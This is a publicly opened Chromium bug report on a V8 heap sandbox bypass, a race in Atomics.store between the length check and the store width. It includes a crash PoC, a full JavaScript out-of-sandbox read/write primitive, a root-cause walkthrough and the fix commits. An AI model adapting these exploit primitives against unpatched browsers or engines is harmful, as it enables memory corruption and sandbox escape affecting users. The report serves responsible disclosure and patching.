# V8 Sandbox Bypass: Atomics TypedArray TOCTOU (Map/Length Mismatch)

| Field | Value |
|-------|-------|
| **Issue ID** | [488927521](https://issues.chromium.org/issues/488927521) |
| **Status** | Verified |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ki...@gmail.com |
| **Assignee** | ma...@chromium.org |
| **Created** | 2026-03-02 |
| **Bounty** | $5,000.00 |

## Description

---

### Report description

Atomics TypedArray TOCTOU (Map/Length Mismatch) Causes Out-of-Sandbox Write

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

---

### The problem

#### Please describe the technical details of the vulnerability

# Atomics TypedArray TOCTOU (Map/Length Mismatch) Causes Out-of-Sandbox Write

## Summary

In the `Atomics.store` path, type consumption (`map`/`elements_kind`) and bounds validation (`length`) can observe different transient states under a map race.  

When combined with in-sandbox corruption of `byte_offset`/`byte_length`, this yields an out-of-sandbox atomic write and triggers:

```
V8 sandbox violation detected!

```
## Root Cause (Code-Based)

1. `ValidateIntegerTypedArray` captures `elements_kind` from the map first.
   - `v8/src/builtins/builtins-sharedarraybuffer-gen.cc:121`
2. The same routine computes the memory base as `backing_store + byte_offset`.
   - `v8/src/builtins/builtins-sharedarraybuffer-gen.cc:153`
   - `v8/src/builtins/builtins-sharedarraybuffer-gen.cc:156`
3. `ValidateAtomicAccess` later performs a separate length read/validation.
   - `v8/src/builtins/builtins-sharedarraybuffer-gen.cc:168`
4. TypedArray length is derived from `raw_byte_length >> element_shift`, where `element_shift` depends on the currently observed elements kind.
   - `v8/src/codegen/code-stub-assembler.cc:17869`
   - `v8/src/codegen/code-stub-assembler.cc:17874`

The break is a stage/provenance mismatch: validation and execution do not enforce one coherent typed-array state.

In this PoC:

- Length check is effectively evaluated as `Uint8Array` (larger allowed index window).
- Actual atomic write executes as `BigUint64Array` (`index << 3` scaling).

The resulting address amplification exceeds the trailing guard budget.

- Guard rationale: `v8/src/sandbox/sandbox.cc:206` to `:210` (260GB workaround region).

## PoC

- File: `274_atomics_map_race_288gb_candidate.js`
- Run:

```
./d8 --sandbox-testing ./274_atomics_map_race_288gb_candidate.js

```
## Execution Result

- Observed output:

```
## V8 sandbox violation detected!
Received signal 11 SEGV_MAPERR 2252660b77fe

```
## gdb Corroboration

- Faulting instruction: `xchg QWORD PTR [r11+r8*1], r10`
- Registers at fault: `r11=0x3ef4fffffffe`, `r8=0x3e660b7800`
- Effective address: `0x3f33660b77fe` (outside sandbox range in that run)

# `274_atomics_map_race_288gb_candidate.js`

```
// Flags: --sandbox-testing

const kTA = Sandbox.getInstanceTypeIdFor('JS_TYPED_ARRAY_TYPE');
const kByteOffsetOff = Sandbox.getFieldOffset(kTA, 'byte_offset');
const kByteLengthOff = Sandbox.getFieldOffset(kTA, 'byte_length');

const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const u32 = (a) => mem.getUint32(a, true);
const w32 = (a, v) => mem.setUint32(a, v >>> 0, true);
const w64 = (a, v) => mem.setBigUint64(a, v, true);

const sab = new SharedArrayBuffer(0);
const victim = new BigUint64Array(sab);
const donorU8 = new Uint8Array(sab);
const donorBig = new BigUint64Array(sab);

const victimAddr = Sandbox.getAddressOf(victim);
const mapAddr = victimAddr;
const mapU8 = u32(Sandbox.getAddressOf(donorU8));
const mapBig = u32(Sandbox.getAddressOf(donorBig));

print('[*] victim=0x' + victimAddr.toString(16));
print('[*] mapU8=0x' + mapU8.toString(16) + ' mapBig=0x' + mapBig.toString(16));

w64(victimAddr + kByteOffsetOff, 0xffffffffffffffffn);
w64(victimAddr + kByteLengthOff, 0xffffffffffffffffn);
print('[*] victim.byteOffset=' + victim.byteOffset + ' byteLength=' + victim.byteLength + ' length=' + victim.length);

// Need index that is valid for Uint8 length (<= 32GB-1) but invalid for BigUint64 length (<= 4GB-1).
const hugeIndex = 33_500_000_000;
print('[*] hugeIndex=' + hugeIndex);

function flipperWorker(addr, mapU8) {
  const m = new DataView(new Sandbox.MemoryView(0, 0x100000000));
  while (true) {
    m.setUint32(addr, mapU8, true);
  }
}

new Worker(new Function(`(${flipperWorker})(${mapAddr}, ${mapU8})`), {type: 'function'});

let ok = 0;
for (let i = 0; i < 2_000_000; i++) {
  // Bias step-1 kind capture to BigUint64.
  w32(mapAddr, mapBig);
  try {
    Atomics.store(victim, hugeIndex, 0x1337n);
    ok++;
  } catch (e) {
    // RangeError/TypeError expected on non-winning interleavings.
  }
  if ((i & 0x3ffff) === 0) {
    print('[*] iter=' + i + ' ok=' + ok + ' curMap=0x' + u32(mapAddr).toString(16));
  }
}

print('[*] finished without crash, ok=' + ok); 

```
#### Impact analysis

Using the V8 Heap Sandbox causes Out Sandbox corruption. If I can produce a proof-of-concept (PoC) demonstrating actual exploitability, I'll add it to the comments.

---

### The cause

#### What version of Chrome have you found the security issue in?

V8 version 14.7.0

#### Is the security issue related to a crash?

Yes, it is related to a crash.

#### Choose the type of vulnerability

Sandbox Escape

## Timeline

### ki...@gmail.com (2026-03-02)

I provide a PoC that provides Out Sandbox READ/WRITE.

```
// Flags: --sandbox-testing
'use strict';

const kTypedArrayType = Sandbox.getInstanceTypeIdFor('JS_TYPED_ARRAY_TYPE');
const kByteOffsetOff = Sandbox.getFieldOffset(kTypedArrayType, 'byte_offset');
const kByteLengthOff = Sandbox.getFieldOffset(kTypedArrayType, 'byte_length');

// JSArrayBuffer::kBackingStoreOffset for this challenge build (x64 + ptr-compr).
const kArrayBufferBackingStoreOff = 0x24;

const kBoundedSizeShift = 29n;
const kSandboxedPointerShift = 24n;
const kMaxBoundedSize = (1n << (64n - kBoundedSizeShift)) - 1n; // 0x7ffffffff
const kMaxBoundedRaw = kMaxBoundedSize << kBoundedSizeShift;     // 0xffffffffff000000
const kMaxIndex = Number(kMaxBoundedSize);
const kMaxDelta = (BigInt(kMaxIndex) << 3n) + kMaxBoundedSize;

function toBigInt(value) {
  if (typeof value === 'bigint') return value;
  if (typeof value === 'number') return BigInt(Math.trunc(value));
  if (typeof value === 'string') return BigInt(value);
  throw new TypeError('address/value must be bigint, number, or bigint string');
}

function makeSandboxMemRW() {
  const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
  return {
    u32(addr) {
      return mem.getUint32(addr, true);
    },
    u64(addr) {
      return mem.getBigUint64(addr, true);
    },
    w32(addr, value) {
      mem.setUint32(addr, value >>> 0, true);
    },
    w64(addr, value) {
      mem.setBigUint64(addr, toBigInt(value), true);
    },
  };
}

class OutSandboxAtomics {
  constructor() {
    const rw = makeSandboxMemRW();
    this.u32 = rw.u32;
    this.u64 = rw.u64;
    this.w32 = rw.w32;
    this.w64 = rw.w64;

    this.sandboxBase = toBigInt(Math.trunc(Sandbox.base));
    this.sandboxSize = toBigInt(Math.trunc(Sandbox.byteLength));
    this.sandboxEnd = this.sandboxBase + this.sandboxSize;
    this.maxDelta = kMaxDelta;

    this.sab = new SharedArrayBuffer(0);
    this.victim = new BigUint64Array(this.sab);
    this.donorU8 = new Uint8Array(this.sab);
    this.donorBig = new BigUint64Array(this.sab);

    this.sabAddr = Sandbox.getAddressOf(this.sab);
    this.victimAddr = Sandbox.getAddressOf(this.victim);
    this.mapAddr = this.victimAddr;
    this.mapU8 = this.u32(Sandbox.getAddressOf(this.donorU8));
    this.mapBig = this.u32(Sandbox.getAddressOf(this.donorBig));

    // Match the original vuln.js trigger shape.
    this.w64(this.victimAddr + kByteLengthOff, 0xffffffffffffffffn);
    this.w64(this.victimAddr + kByteOffsetOff, 0xffffffffffffffffn);

    // Default backing store is the empty backing-store marker.
    this.setBackingStoreAbsolute(this.sandboxEnd - 1n);

    this.startMapFlipper();
  }

  startMapFlipper() {
    function flipper(mapAddr, mapU8) {
      const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
      while (true) {
        mem.setUint32(mapAddr, mapU8, true);
      }
    }
    new Worker(new Function(`(${flipper})(${this.mapAddr}, ${this.mapU8})`), {
      type: 'function',
    });
  }

  encodeSandboxedPointer(addressAbs) {
    const ptr = toBigInt(addressAbs);
    if (ptr < this.sandboxBase || ptr >= this.sandboxEnd) {
      throw new Error('backing_store pointer must be inside sandbox');
    }
    return (ptr - this.sandboxBase) << kSandboxedPointerShift;
  }

  setBackingStoreAbsolute(addressAbs) {
    const raw = this.encodeSandboxedPointer(addressAbs);
    this.w64(this.sabAddr + kArrayBufferBackingStoreOff, raw);
    this.currentBackingStore = toBigInt(addressAbs);
  }

  setVictimByteOffset(value) {
    const off = toBigInt(value);
    if (off < 0n || off > kMaxBoundedSize) {
      throw new Error('byte_offset out of bounded-size range');
    }
    this.w64(this.victimAddr + kByteOffsetOff, off << kBoundedSizeShift);
    this.currentByteOffset = off;
  }

  expectedAddressForIndex(index) {
    return this.currentBackingStore +
        this.currentByteOffset +
        (toBigInt(index) << 3n);
  }

  // Solve target = backing_store + byte_offset + index * 8.
  planForAddress(addressAbs) {
    const target = toBigInt(addressAbs);
    if ((target & 7n) !== 0n) {
      throw new Error('target address must be 8-byte aligned');
    }

    let backing = target;
    if (backing < this.sandboxBase) backing = this.sandboxBase;
    if (backing >= this.sandboxEnd) backing = this.sandboxEnd - 1n;

    const delta = target - backing;
    if (delta < 0n || delta > this.maxDelta) {
      throw new Error('target is outside current OoS primitive reach');
    }

    let indexBig = delta >> 3n;
    if (indexBig > BigInt(kMaxIndex)) indexBig = BigInt(kMaxIndex);
    const byteOffset = delta - (indexBig << 3n);
    if (byteOffset > kMaxBoundedSize) {
      throw new Error('failed to encode byte_offset for target');
    }

    const index = Number(indexBig);
    if (!Number.isSafeInteger(index)) {
      throw new Error('index conversion failed');
    }

    return {
      target,
      backing,
      byteOffset,
      index,
      indexBig,
      expected: backing + byteOffset + (indexBig << 3n),
    };
  }

  configureAddress(addressAbs) {
    const plan = this.planForAddress(addressAbs);
    this.setBackingStoreAbsolute(plan.backing);
    this.setVictimByteOffset(plan.byteOffset);
    return plan;
  }

  forceBigMap() {
    this.w32(this.mapAddr, this.mapBig);
  }

  write64Loop(index, value, maxIters = 2_000_000) {
    let wins = 0;
    const v = toBigInt(value);
    for (let i = 0; i < maxIters; i++) {
      this.forceBigMap();
      try {
        Atomics.store(this.victim, index, v);
        wins++;
      } catch (e) {
      }
    }
    return wins;
  }

  read64Loop(index, maxIters = 2_000_000) {
    let wins = 0;
    let last = 0n;
    for (let i = 0; i < maxIters; i++) {
      this.forceBigMap();
      try {
        last = Atomics.load(this.victim, index);
        wins++;
      } catch (e) {
      }
    }
    return {wins, last};
  }

  write64UntilCrash(index, value) {
    const v = toBigInt(value);
    while (true) {
      this.forceBigMap();
      try {
        Atomics.store(this.victim, index, v);
      } catch (e) {
      }
    }
  }

  read64UntilCrash(index) {
    while (true) {
      this.forceBigMap();
      try {
        Atomics.load(this.victim, index);
      } catch (e) {
      }
    }
  }

  write64AtAddress(addressAbs, value, maxIters = 2_000_000) {
    const plan = this.configureAddress(addressAbs);
    return this.write64Loop(plan.index, value, maxIters);
  }

  read64AtAddress(addressAbs, maxIters = 2_000_000) {
    const plan = this.configureAddress(addressAbs);
    return this.read64Loop(plan.index, maxIters);
  }

  write64CrashAtAddress(addressAbs, value) {
    const plan = this.configureAddress(addressAbs);
    this.write64UntilCrash(plan.index, value);
  }

  read64CrashAtAddress(addressAbs) {
    const plan = this.configureAddress(addressAbs);
    this.read64UntilCrash(plan.index);
  }
}

globalThis.OutSandboxAtomics = OutSandboxAtomics;

const p = new OutSandboxAtomics();

function arbWrite64(index, value, maxIters = 2_000_000) {
  const i = Number(index);
  if (!Number.isSafeInteger(i) || i < 0) {
    throw new Error('index must be a non-negative safe integer');
  }
  return p.write64Loop(i, BigInt(value), maxIters);
}


const index = 33_500_000_000;
const value = 0xdeadbeefdeadbeefn;
arbWrite64(index, value, 500000);
```

### ki...@gmail.com (2026-03-03)

I've added some additional information to the report, as I believe the report may have issues with analysis due to the fact that it only contains line numbers instead of specific code.

Additional information:
1. Out Sandbox READ/WRITE POC (provided in the first comment).
2. Detailed root cause (provided in the current comment).

If you have any trouble reproducing this vulnerability, please let me know. Thank you.

# Root Cause Analysis

## TL;DR
This issue is **not** a simple missing bounds check.  
The core problem is that `Atomics.store` does **not** use one coherent typed-array state (`map` / `elements_kind`) across all validation and execution stages.

- Execution path selection (`u8/u16/u32/u64`) uses an early-captured `elements_kind`.
- Index range validation (`index < length`) later recomputes length using a fresh `LoadElementsKind(array)` read.

As a result, the **type used for validation** can differ from the **type used for the actual memory write**.

---

## 1) Where the split happens inside `Atomics.store`

### A. `elements_kind` and `backing_store` are captured early
`v8/src/builtins/builtins-sharedarraybuffer-gen.cc`
```cpp
// AtomicsStore(...)
TNode<Int32T> elements_kind;
TNode<RawPtrT> backing_store;
ValidateIntegerTypedArray(..., &elements_kind, &backing_store, ...);
```

Inside `ValidateIntegerTypedArray`:
```cpp
TNode<Int32T> elements_kind =
    GetNonRabGsabElementsKind(LoadMapElementsKind(map));
...
TNode<RawPtrT> backing_store = LoadJSArrayBufferBackingStorePtr(array_buffer);
TNode<UintPtrT> byte_offset = LoadJSArrayBufferViewByteOffset(array);
*out_backing_store = RawPtrAdd(backing_store, Signed(byte_offset));
```

### B. Index validation computes length later, from a fresh kind read
```cpp
TNode<UintPtrT> index_word = ValidateAtomicAccess(array, index, context);
```

Inside `ValidateAtomicAccess`:
```cpp
TNode<UintPtrT> array_length = LoadJSTypedArrayLengthAndValidate(...);
Branch(UintPtrLessThan(index_uintptr, array_length), &done, &range_error);
```

`LoadJSTypedArrayLength` derives length using the **current** `LoadElementsKind(typed_array)`:
`v8/src/codegen/code-stub-assembler.cc`
```cpp
TNode<UintPtrT> byte_length = LoadBoundedSizeFromObject(...kRawByteLengthOffset);
TNode<Uint8T> element_shift =
    ElementsKindToElementByteShift(LoadElementsKind(typed_array));
return WordShr(byte_length, element_shift);
```

### C. The actual store still uses the early-captured `elements_kind`
```cpp
GotoIf(Int32GreaterThan(elements_kind, Int32Constant(INT32_ELEMENTS)), &u64);
...
BIND(&u64);
AtomicStore64(..., backing_store, WordShl(index_word, 3), ...);
```

In short:
- Length check is based on a re-read elements kind.
- Access width / addressing scale (`<< 3` for 64-bit) is based on the earlier captured kind.

---

## 2) Why the PoC bypass works (state-mismatch interleaving)

```js
new Worker(new Function(`(${flipperWorker})(${mapAddr}, ${mapU8})`), {type: 'function'});

for (...) {
  w32(mapAddr, mapBig);                 // force BigUint64 map right before call
  Atomics.store(victim, hugeIndex, poisonValue);
}
```

Winning interleaving for one `Atomics.store` call:
1. During `ValidateIntegerTypedArray`, map is `BigUint64Array`.
   - Captures `elements_kind = BIGUINT64_ELEMENTS`.
   - Captures `backing_store + byte_offset`.
2. Worker flips map to `Uint8Array`.
3. During `ValidateAtomicAccess`, length is computed with `element_shift = 0` (Uint8), producing a larger allowed index range.
4. Actual store path still follows captured `BIGUINT64` behavior:
   - Effective write offset uses `WordShl(index, 3)` (8-byte scaling).

So validation is effectively **Uint8-based**, while execution is **BigUint64-based**.

### cl...@appspot.gserviceaccount.com (2026-03-05)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6040049720164352.

### 24...@project.gserviceaccount.com (2026-03-05)

Detailed Report: https://clusterfuzz.com/testcase?key=6040049720164352

Fuzzer: None
Job Type: linux_asan_d8_sandbox_testing
Platform Id: linux

Crash Type: V8 sandbox violation
Crash Address: 0x7ff0660b77fe
Crash State:
  Builtins_AtomicsStore
  Builtins_InterpreterEntryTrampoline
  Builtins_InterpreterEntryTrampoline
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_sandbox_testing&range=100584:100585

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6040049720164352

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### cl...@chromium.org (2026-03-06)

Marja, you are the unlucky person to which this bisects. But luckily you are also an expert on TypedArrays!

Can you take this one?

### ma...@chromium.org (2026-03-09)

Sure, this is def mine :)

### dx...@google.com (2026-03-11)

Project: v8/v8  

Branch:  main  

Author:  Marja Hölttä [marja@chromium.org](mailto:marja@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7651904>

[typed arrays] Fix ElementsKinds switcheroo with Atomics

---


Expand for full commit details
```
     
    Fixed: 488927521 
    Change-Id: I2359ff752df3760ffaf246e218f92c448f26d84e 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7651904 
    Reviewed-by: Igor Sheludko <ishell@chromium.org> 
    Commit-Queue: Marja Hölttä <marja@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105715}

```

---

Files:

- M `src/builtins/builtins-sharedarraybuffer-gen.cc`
- M `src/codegen/code-stub-assembler.cc`
- M `src/codegen/code-stub-assembler.h`
- A `test/mjsunit/sandbox/regress-488927521.js`

---

Hash: [149c19dcbdb2cc6f5dc4f46b1659c696d9ee979f](https://chromiumdash.appspot.com/commit/149c19dcbdb2cc6f5dc4f46b1659c696d9ee979f)  

Date: Tue Mar 10 13:05:13 2026


---

### 24...@project.gserviceaccount.com (2026-03-11)

ClusterFuzz testcase 6040049720164352 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_sandbox_testing&range=105714:105715

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### dx...@google.com (2026-03-20)

Project: v8/v8  

Branch:  main  

Author:  Arash Kazemi [arashk@chromium.org](mailto:arashk@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7680233>

[sandbox] Increase guard region size to include bounded size offset

---


Expand for full commit details
```
     
    When the sandbox is enabled, TypedArrays store the offset as a bounded 
    size. The current guard regions assume that such offset is a uint32 
    therefore reserving 4GB of address space for that, however, the actual 
    size can be up to 32GB. 
     
    This CL increases the size of the guard regions by an additional 28GB to 
    account for this difference. 
     
    Bug: 488927521 
    Change-Id: Ifd04df199280d10f293213636adf7009db019629 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7680233 
    Reviewed-by: Michael Lippautz <mlippautz@chromium.org> 
    Commit-Queue: Arash Kazemi <arashk@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105933}

```

---

Files:

- M `include/v8-internal.h`
- M `src/sandbox/sandbox.cc`

---

Hash: [327ecc410ec5f1e7662f93378e6eb458e6e92ab8](https://chromiumdash.appspot.com/commit/327ecc410ec5f1e7662f93378e6eb458e6e92ab8)  

Date: Thu Mar 19 10:12:11 2026


---

### ki...@gmail.com (2026-04-24)

A significant amount of time has passed since this report was uploaded to the rewards panel. According to the Code of Conduct, I may request a progress update after three weeks. I request a reward-related update for this report.

Thank you.

### sp...@google.com (2026-06-15)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $5000.00 for this report.

Rationale for this decision:
v8 Sandbox bypass


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-06-18)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/488927521)*
